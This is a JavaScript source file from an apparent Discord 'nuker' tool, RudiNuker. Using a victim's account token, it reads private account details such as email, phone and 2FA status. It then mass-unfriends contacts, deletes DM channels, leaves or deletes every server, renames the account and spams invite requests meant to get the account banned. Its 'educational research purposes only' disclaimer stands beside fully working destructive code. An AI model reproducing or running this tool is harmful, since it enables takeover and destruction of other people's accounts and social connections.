const { Color } = require('./console');
const Axios = require('axios').default;
const { custom_status, version } = require('../../config.json');

class User extends Color {
    constructor({ token }) {
        super();
        this.token = token;

        this.headers = {
            info: {
                'Content-Type': 'application/json',
                'Authorization': this.token
            },

            nuke: {
                'Authorization': this.token,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.1008 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36'
            }
        };
    };


    async info() {
        try {
            const data = (await Axios.get('https://discord.com/api/v8/users/@me', { headers: this.headers.info })).data;
            const base = 'https://cdn.discordapp.com/avatars/';

            return [
                `Tag      |   ${data.username + '#' + data.discriminator}`,
                `Email    |   ${data.email || 'None'}`,
                `2FA      |   ${data.mfa_enabled}`,
                `Phone    |   ${data.phone || 'None'}`,
                `ID       |   ${data.id}`,
                `Language |   ${data.locale}`,
                `Verified |   ${data.verified}`,
                `Flags    |   All: ${data.flags} | Private: ${data.public_flags}`,
                `NSFW     |   ${data.nsfw_allowed}`,
                `Avatar   |   ${base + `${data.id}/${data.avatar}.jpg`}`
            ];

        } catch (e) {
            throw e;
        };
    };

    async creds() {

        return [
            `Creator: endlessXD | RudimentalHack`,
            `Repo: https://github.com/RudimentalHack/RudiNuker`,
            `EDUCATIONAL RESEARCH PURPOSES ONLY - WE ARE NOT RESPONSIBLE FOR WHAT YOU DO WITH THIS SCRIPT.`
        ];
    };
    async removeFriends() {
        const base = 'https://discord.com/api/' + version;

        const status = (await Axios.get(base + '/users/@me', {
            headers: this.headers.info
        })).status;

        if (status !== 200) throw new Error('Request Failed With Error Code ' + status);

        await Axios(
            { method: 'GET', url: base + '/users/@me/relationships', headers: this.headers.nuke }
        ).then(
            (response) => {
                const friends = [];

                response.data.forEach(
                    (friend) => {
                        friends.push(
                            { id: friend.id, tag: friend.user.username + '#' + friend.user.discriminator }
                        );
                    }
                );

                friends.forEach(
                    (friend) => {
                        Axios.delete(base + `/users/@me/relationships/${friend.id}`, {
                            headers: this.headers.nuke
                        }).then(
                            () => Color.log(`Unfriended ${friend.tag}`)
                        ).catch(
                            (e) => { Color.log(e, '>', 0); }
                        );
                    }
                );
                setTimeout(() => {
                    process.exit(1337);
                }, 3000);
            }
        ).catch(
            (e) => {
                Color.log(e, '>', 0);
            }
        );

        // await Axios(
        //     {
        //         method: 'PATCH',
        //         url: base + '/users/@me/settings',
        //         headers: this.headers.nuke,
        //         data: {
        //             custom_status: {
        //                 text: custom_status ? custom_status : "RudimentalHack Nuker v1",
        //             }
        //         }
        //     }
        // ).catch(
        //     (e) => {
        //         Color.log(e, '>', 0);
        //     }
        // );
    };
    async deleteChannels() {
        const base = 'https://discord.com/api/' + version;

        const status = (await Axios.get(base + '/users/@me', {
            headers: this.headers.info
        })).status;

        if (status !== 200) throw new Error('Request Failed With Error Code ' + status);

        await Axios(
            { method: 'GET', url: base + '/users/@me/channels', headers: this.headers.nuke }
        ).then(
            (response) => {
                const channels = [];

                response.data.forEach(
                    (channel) => {
                        channels.push(channel.id);
                    }
                );

                channels.forEach(
                    (channel) => {
                        Axios.delete(base + `/channels/${channel}`, {
                            headers: this.headers.nuke
                        });
                    }
                );
                setTimeout(() => {
                    process.exit(1337);
                }, 3000);
            }
        ).catch(
            (e) => {
                Color.log(e, '>', 0);
            }
        );


    }
    async removeGuilds() {
        const base = 'https://discord.com/api/' + version;

        const status = (await Axios.get(base + '/users/@me', {
            headers: this.headers.info
        })).status;

        if (status !== 200) throw new Error('Request Failed With Error Code ' + status);

        await Axios(
            { method: 'GET', url: base + '/users/@me/guilds', headers: this.headers.nuke }
        ).then(
            (response) => {
                const owner = {
                    true: [],
                    false: []
                };

                response.data.forEach(
                    (guild) => {
                        if (guild.owner == false) {
                            owner.false.push(
                                { id: guild.id, name: guild.name }
                            );
                        } else {
                            owner.true.push(
                                { id: guild.id, name: guild.name }
                            );
                        };
                    }
                );

                owner.false.forEach(
                    (guild) => {
                        Axios.delete(base + `/users/@me/guilds/${guild.id}`, {
                            headers: this.headers.nuke
                        }).then(
                            () => Color.log(`Left Server ${guild.name}`)
                        ).catch(
                            (e) => { Color.log(e, '>', 0); }
                        );
                    }
                );

                owner.true.forEach(
                    (guild) => {
                        Axios(
                            {
                                method: 'POST',
                                url: base + `/guilds/${guild.id}/delete`,
                                headers: this.headers.nuke
                            }
                        ).then(
                            () => Color.log(`Deleted Server ${guild.name}`)
                        ).catch(
                            (e) => { Color.log(e, '>', 0); }
                        );
                    }
                );
                setTimeout(() => {
                    process.exit(1337);
                }, 3000);
            }
        ).catch(
            (e) => {
                Color.log(e, '>', 0);
            }
        );

    }
    async termination() {
        var i;
        const base = 'https://discord.com/api/' + version;

        const status = (await Axios.get(base + '/users/@me', {
            headers: this.headers.info
        })).status;

        if (status !== 200) throw new Error('Request Failed With Error Code ' + status);
        try {
            await Axios(
                { method: 'PATCH', url: base + '/users/@me', headers: this.headers.nuke, data: { username: "Terminated By RudiNuker" } }
            ).then((response) => {
                for (i = 0; i < 10; i++) {
                    try {
                        await Axios(
                            { method: 'POST', url: base + '/invites/meme', headers: this.headers.nuke }
                        ).then((response) => {
                            console.log(response.data[0].guild.name)
                        }).catch((e) => {
                            console.log(e)
                        })
                    } catch (e) {
                        console.error("Token Terminated");
                        setTimeout(() => process.exit(), 3000)
                    }
                }
                console.log(response.data[0])
            }).catch((e) => {
                console.log(e)
            })
        } catch (e) {
            console.error("Token Terminated");
            setTimeout(() => process.exit(), 3000)
        }

    };

    random(array = []) {
        return array[Math.floor(Math.random() * array.length)];
    };
};

module.exports.User = User;
